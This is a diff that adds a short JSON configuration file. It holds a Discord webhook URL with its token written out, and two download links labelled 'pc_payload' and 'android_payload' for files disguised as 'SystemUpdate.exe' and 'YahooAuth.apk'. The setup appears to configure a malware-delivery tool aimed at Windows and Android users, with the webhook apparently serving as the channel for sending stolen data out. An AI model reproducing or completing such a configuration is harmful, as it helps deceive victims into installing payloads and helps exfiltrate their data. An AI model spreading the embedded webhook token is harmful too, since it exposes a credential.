@@ -1,0 +1,5 @@
+{
+  "webhook_url": "https://discord.com/api/webhooks/1451568328110768180/XDAX_SwVWzfVzgUmxz1CsqV15didathNbrJPkhu3WxG8Iq8YWhBYFev-erHotiEKEshK",
+  "pc_payload": "https://example.com/SystemUpdate.exe",
+  "android_payload": "https://example.com/YahooAuth.apk"
+}
